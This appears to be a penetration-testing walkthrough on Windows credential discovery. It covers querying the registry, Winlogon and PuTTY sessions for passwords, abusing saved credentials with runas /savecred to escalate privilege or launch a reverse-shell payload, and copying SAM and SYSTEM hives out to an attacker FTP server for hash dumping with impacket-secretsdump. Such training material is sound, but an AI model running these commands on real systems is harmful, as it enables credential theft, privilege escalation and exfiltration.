**Credential Discovery**

**1.Registries:-**

Registry contains configuration files, so we can find some passwords.

reg query HKLM /f password /t REG_SZ /s

We are searching in Local Machine (HKLM)

<img width="828" height="179" alt="image" src="https://github.com/user-attachments/assets/cf314937-8485-45e9-9908-88f9e393f2e4" />

Output will be like this.

<img width="786" height="261" alt="image" src="https://github.com/user-attachments/assets/e438e587-a1a2-422e-aba2-75141aff1fc3" />

This command will bring all the lines where keyword is “Password”

**winlogon :-**

There is a registry called winlogon. We can enable this registry and put username and password. So next time windows will automatically login the user without asking for a password.

***reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon***

<img width="786" height="241" alt="image" src="https://github.com/user-attachments/assets/e9cfcbc2-e4ac-4bf0-a2c8-0b073741747f" />

We can see default username is admin. However we dont find any default password in this case.

<img width="786" height="572" alt="image" src="https://github.com/user-attachments/assets/5e7740ca-87a3-4038-a71f-d2d65f489cb4" />

**Putty:-**

Putty is a software used to login any device from remote via SSH or Telnet. In putty registry we can find some credentials.

***reg query “HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions”***

From the above command we can check any active session on the machine.

<img width="786" height="130" alt="image" src="https://github.com/user-attachments/assets/86fef153-570a-45ad-8f20-49ecb99efe72" />

There is one live session. We can query this session

***reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42***

<img width="786" height="120" alt="image" src="https://github.com/user-attachments/assets/b7d052ac-913c-4047-b6e8-14f9c46343a0" />

We got a username and password.

**2. Windows Credential Manager (CMD)**

User can save some credentials on the password manager. We can try to get them.

***cmdkey /list***

<img width="762" height="305" alt="image" src="https://github.com/user-attachments/assets/0d7412d6-beaf-4c9e-97a6-c66b1a214f08" />

It saying the there is a password stored in the CMD however its not showing the password.

<img width="786" height="333" alt="image" src="https://github.com/user-attachments/assets/f55aa1af-6fde-4e58-a1ef-3cc2808161d9" />

Now with this we can escalate privilege.

***runas /savecred /user:admin cmd.exe***

<img width="786" height="191" alt="image" src="https://github.com/user-attachments/assets/639361ca-dbe0-4324-aef6-e4f1f0726673" />

<img width="630" height="197" alt="image" src="https://github.com/user-attachments/assets/390445a5-ea83-4650-9d22-c5a8c8797293" />

We are asking to open cmd of admin user. Take admin user credentials which is stored (/savecred)

We can also generate a reverse shell from msfvenom and put here. Then we can execute this payload.

***runas /savecred /user:admin reverse_shell.exe***

**3. SAM / System Databse**

Just like /etc/shadow file in Linux which contains users passwords, windows has SAM Database.

Now, lets try to copy SAM database in the local folder

***copy C:\Windows\System32\Config\SAM***

<img width="786" height="150" alt="image" src="https://github.com/user-attachments/assets/06edbaff-d432-454b-8d7c-932ad29097a0" />

Access Denied. We dont have read permissions.

Now, while looking around, we found a folder Repair

<img width="786" height="412" alt="image" src="https://github.com/user-attachments/assets/7a62ce90-37b0-409a-9b33-255d6b376ef7" />

<img width="786" height="314" alt="image" src="https://github.com/user-attachments/assets/f781c77d-bdf9-4d12-b590-b02b3f3c2dc2" />

In this folder we found SAN and SYSTEM Database

Lets try to copy this in user folder

<img width="715" height="107" alt="image" src="https://github.com/user-attachments/assets/dcf8a897-e562-4a7e-a429-5ed111ef31f4" />

This file is copied to user folder. It means we have permission to read this file.

Now SAM Database is an encrypted File. To decrypt it we need to have a key. We can find this Key in SYSTEM file.

Now we need to transfer these two files to decrypt it.

On our local machine lets start FTP sever

***python3 -m pyftpdlib --write --port 21***

--write >> it will enable to target machine to write any file to the FTP server.

<img width="786" height="246" alt="image" src="https://github.com/user-attachments/assets/4a8bdca0-fb18-47fa-a746-fcda70c819fe" />

Lets go to windows machine and transfer the file

<img width="786" height="324" alt="image" src="https://github.com/user-attachments/assets/4ea8afb6-3099-456b-a778-a721eed77578" />

ftp <IP Address>

As we have not set any username and password, we can login by anonymous and blank password.

Now, as SAM Database is an encrypted file, we have to enable FTP into binary mode so that file got transferred without any error.

put <filename> to copy the file

<img width="712" height="198" alt="image" src="https://github.com/user-attachments/assets/15f4fa5d-830e-4d92-ba15-ba7e3747f992" />

Similarly we have copied the SYSTEM file as well.

<img width="786" height="211" alt="image" src="https://github.com/user-attachments/assets/641e3a9a-4f97-4c29-9630-122fbcdbf670" />

Now we need to decrypt the files

***impacket-secretsdump -sam SAM -system SYSTEM LOCAL***

<img width="786" height="250" alt="image" src="https://github.com/user-attachments/assets/5de1f19f-113c-4950-b0e6-ff7dd94c960c" />
